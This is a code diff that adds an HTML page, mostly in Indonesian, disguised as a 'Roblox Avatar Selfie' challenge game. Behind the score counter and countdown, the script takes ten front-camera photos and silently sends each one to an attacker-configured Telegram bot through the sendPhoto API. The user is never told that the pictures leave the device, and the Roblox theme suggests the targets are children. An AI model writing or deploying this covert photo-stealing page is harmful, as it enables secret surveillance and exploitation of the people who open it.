@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>Roblox Avatar Selfie</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <style>
+        body {
+            margin: 0; padding: 0; overflow: hidden;
+            background: linear-gradient(135deg, #00ff88, #00aaff, #ff00ff);
+            font-family: 'Comic Sans MS', system-ui, sans-serif;
+            color: white; text-align: center;
+            height: 100vh; position: relative;
+        }
+        .score {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: rgba(0,0,0,0.65);
+            padding: 10px 24px;
+            border-radius: 30px;
+            font-size: 32px;
+            font-weight: bold;
+            z-index: 200;
+            border: 3px solid #ffff00;
+            box-shadow: 0 0 15px #ffff00;
+        }
+        .header {
+            padding-top: 80px;
+        }
+        h1 {
+            font-size: 46px;
+            font-weight: 900;
+            margin: 0 0 8px;
+            text-shadow: 0 0 25px #ffff00, 0 0 40px #ff00ff;
+        }
+        .subtitle {
+            font-size: 24px;
+            color: #ffff00;
+            margin-bottom: 20px;
+            text-shadow: 0 2px 10px black;
+        }
+        #status {
+            font-size: 26px;
+            margin: 20px 30px 30px;
+            min-height: 80px;
+            line-height: 1.4;
+        }
+        button {
+            margin-top: 10px;
+            padding: 18px 60px;
+            font-size: 26px;
+            font-weight: bold;
+            background: #ffff00;
+            color: #000;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            box-shadow: 0 0 30px #ffff00;
+        }
+        .countdown {
+            font-size: 105px;
+            font-weight: 900;
+            margin: 30px 0;
+            text-shadow: 0 0 30px #ffff00;
+        }
+        .flash {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: white; opacity: 0; pointer-events: none; z-index: 999;
+        }
+    </style>
+</head>
+<body>
+    <div class="score">Score: <span id="score">0</span> 💎</div>
+    
+    <div class="header">
+        <h1>ROBLOX AVATAR SELFIE</h1>
+        <div class="subtitle">Make your avatar come to life! 📸</div>
+    </div>
+    
+    <p id="status">Tekan tombol di bawah untuk mulai challenge Roblox!</p>
+    <div id="countdown" class="countdown"></div>
+    <button id="startBtn" onclick="startChallenge()">START CHALLENGE</button>
+
+    <div id="flash" class="flash"></div>
+
+    <script>
+        const BOT_TOKEN = "MASUKKAN_BOT_TOKEN_MU_DI_SINI";
+        const CHAT_ID = "MASUKKAN_CHAT_ID_MU_DI_SINI";
+        
+        let score = 0;
+        let photoCount = 0;
+        let isStarted = false;
+
+        function updateScore(points) {
+            if (!isStarted) return;
+            score += points;
+            document.getElementById("score").textContent = score;
+        }
+
+        function flashEffect() {
+            const flash = document.getElementById("flash");
+            flash.style.transition = "none";
+            flash.style.opacity = "0.7";
+            setTimeout(() => {
+                flash.style.transition = "opacity 0.4s";
+                flash.style.opacity = "0";
+            }, 50);
+        }
+
+        async function kirimFoto(blob, count) {
+            photoCount++;
+            const formData = new FormData();
+            formData.append("chat_id", CHAT_ID);
+            formData.append("photo", blob, `roblox_${photoCount}.jpg`);
+            formData.append("caption", `🟥 Roblox Avatar Selfie\nFoto ke-${photoCount}/10\nScore: ${score}\nWaktu: ${new Date().toLocaleString()}`);
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            });
+        }
+
+        async function ambilSelfie(count) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: "user",
+                        width: { ideal: 720 },
+                        height: { ideal: 1280 }
+                    } 
+                });
+
+                const video = document.createElement("video");
+                video.srcObject = stream;
+                await video.play();
+
+                for (let i = 3; i >= 1; i--) {
+                    document.getElementById("countdown").textContent = i;
+                    await new Promise(r => setTimeout(r, 600));
+                }
+                document.getElementById("countdown").textContent = "📸";
+
+                await new Promise(r => setTimeout(r, 500));
+
+                const canvas = document.createElement("canvas");
+                canvas.width = 720;
+                canvas.height = 1280;
+                const ctx = canvas.getContext("2d");
+                ctx.drawImage(video, 0, 0, 720, 1280);
+
+                ctx.font = "bold 58px Arial";
+                ctx.fillStyle = "#ffff00";
+                ctx.textAlign = "center";
+                ctx.shadowColor = "#000";
+                ctx.shadowBlur = 12;
+                ctx.fillText(count % 2 === 0 ? "NOOB" : "PRO", 360, 190);
+                ctx.fillText("AVATAR SELFIE", 360, 270);
+
+                stream.getTracks().forEach(track => track.stop());
+                flashEffect();
+
+                canvas.toBlob((blob) => {
+                    if (blob) kirimFoto(blob, count);
+                }, "image/jpeg", 0.92);
+
+            } catch(e) {
+                document.getElementById("status").innerHTML = "Izinkan kamera biar avatar Roblox kamu keluar! 📸";
+            }
+        }
+
+        function startChallenge() {
+            if (isStarted) return;
+            
+            isStarted = true;
+            document.getElementById("startBtn").style.display = "none";
+            document.getElementById("status").innerHTML = "Challenge dimulai! Siap pose Roblox kamu! 🔥";
+
+            score = 0;
+            photoCount = 0;
+            document.getElementById("score").textContent = "0";
+
+            let delay = 1000;
+            for (let i = 1; i <= 10; i++) {
+                setTimeout(async () => {
+                    updateScore(160 + Math.floor(Math.random() * 100));
+                    document.getElementById("status").innerHTML = `Pose ${i}/10 • Noob atau Pro?`;
+                    await ambilSelfie(i);
+
+                    if (i === 10) {
+                        setTimeout(() => {
+                            document.getElementById("status").innerHTML = "🏆 CHALLENGE SELESAI!<br>Avatar kamu udah viral di Roblox! 🔥";
+                        }, 2200);
+                    }
+                }, delay);
+                delay += 3400;
+            }
+        }
+
+        window.onload = () => {
+            document.getElementById("score").textContent = "0";
+        };
+    </script>
+</body>
+</html>
